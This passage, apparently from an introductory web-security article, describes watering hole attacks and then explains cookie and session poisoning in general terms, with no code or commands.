vulnerabilities, he injects a malicious script / code into the web application that can redirect the web page and download malware onto the victim's machine. After infecting the vulnerable web application, 
the attacker waits for the victim to access the infected web application. This attack is called a watering hole attack, as the attacker waits for the victim to fall into the trap, similar to a lion waiting 
for its prey to arrive at a watering hole to drink water. When the victim surfs the infected website, the web page redirects him and downloads malware onto his machine.</p>
<h2>Cookie / Session Poisoning</h2>
<p>Cookies are generally used to maintain a session between web applications and users; thus cookies need to transmit sensitive credentials frequently. The attacker can modify the cookies' information 
with ease to escalate access or assume the identity of another users. By modifying the data in a cookie, an attacker can often gain escalated access or maliciously affect the user's session. Many sites offer 
the ability to <b>Remember me?</b> and store the user's information in a cookie so the user does not have to re-enter the data with every visit to the site. Any private information entered is stored in a 
cookie. To protect cookies, site developers often encode them. Easily reversible encoding methods such as Base64 and ROT13 give a false sense of security to the users who view cookies. </p>
<h2>Threats</h2>
<p>Compromised cookies and sessions can provide an attacker with user credentials, allowing the attacker to access accounts and assume the identity of other users of an application. By assuming another 
user's online identity, attackers can review the original user's purchase history, order new items, exploit services and access the vulnerable web application. One of the easiest examples involves 
using the cookie directly for authentication. Another method of cookie / session poisoning uses a proxy to rewrite the session data, displaying the cookie data and / or specifying a new user ID or other 
session identifiers in the cookie. There are four types of cookies: persistent, non-persistent, secure and non-secure. Persistent cookies are stored on a disk, whereas non-persistent ones are stored 
in memory. Web applications transfer secure cookies only through SSL connections.</p>
<h2>How Cookie poisoning works</h2>
<p>Web applications use cookies to simulate a stateful user browsing experience, depending on the end user and identity of the server side of web application components. Cookie poisoning alters the 
value of a cookie at the client side before the request is sent to the server. A web server can send a set cookie with the help of any response over the provided string and command. The cookies are stored 
on the users' computers and are a standard way of recognizing users. Once the web server is set, it receives all the requests from the cookies. To provide further functionality to the application, cookies 
support modification and analysis by JavaScript. </p>
<p>In this attack, the attacker sniffs the user's cookie and then modifies the cookie parameters and submits them to the web server. The server then accepts the attacker's request and processes it. </p>
